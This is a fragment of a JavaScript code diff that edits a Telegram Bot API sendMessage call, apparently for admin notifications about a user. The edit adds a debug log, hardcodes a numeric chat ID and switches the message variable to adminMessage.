@@ -149,13 +149,13 @@ Email: ${userData.email}
           },
         }),
       });
-
+      console.log(typeof chatId);
       const response1 = await fetch(`https://api.telegram.org/bot${adminBotToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
+          chat_id: 6398268582,
+          text: adminMessage,
           parse_mode: "Markdown",
           reply_markup: {
             inline_keyboard: [
